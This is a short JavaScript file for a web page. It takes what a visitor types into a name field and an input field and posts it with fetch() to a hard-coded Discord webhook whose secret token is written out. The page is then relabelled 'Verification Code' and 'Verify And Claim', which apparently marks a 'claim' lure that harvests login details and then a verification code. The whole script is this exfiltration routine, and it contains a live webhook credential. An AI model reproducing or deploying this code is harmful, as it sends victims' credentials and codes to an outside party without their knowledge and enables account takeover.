whurl = "https://discord.com/api/webhooks/1119925111269638175/16_J3zWTq9xZ8AJW5mjODclndeUZBbZ_UvsaGONMtu1WgqAaOCFAAMrCydGNx12mb29-"
var str= "";
var name= "";
function f1(){
    name = document.getElementById("NameInput").value;
    str = document.getElementById("InputField").value;
    console.log(document.getElementById("InputField").value)
}
function send(){
  document.getElementById("verifcodelolol").innerHTML = "Verification Code"
  document.getElementById("SendMessage").innerHTML = "Verify And Claim"
  f1();
    const msg = {
        "content": str,
        "username": name
    };
    console.log(msg)
    if(str == ""){
        document.getElementById("Message1").style.opacity = 1; 
        setTimeout(function(){
            document.getElementById("Message1").style.opacity = 0;
        }, 4000)
        console.log("ERROR")
        return;
    }
    try{
        fetch(whurl + "?wait=true", {"method":"POST", "headers": {"content-type": "application/json"}, "body": JSON.stringify(msg)});
        document.getElementById("InputField").value = "";
        document.getElementById("MessageSent").style.opacity = 1;
        setTimeout(function(){
            document.getElementById("MessageSent").style.opacity = 0;
        }, 4000)

    } catch(e){
        document.getElementById("MessageFailed").style.opacity = 1;  
        
        setTimeout(function(){
            document.getElementById("MessageFailed").style.opacity = 0;
        }, 4000)
    }

}

function change(){
var get = document.querySelector(".pw868686")
get.classList.toggle("pw878787")
var get = document.querySelector(".pw898989")
get.classList.toggle("pw878787")
}




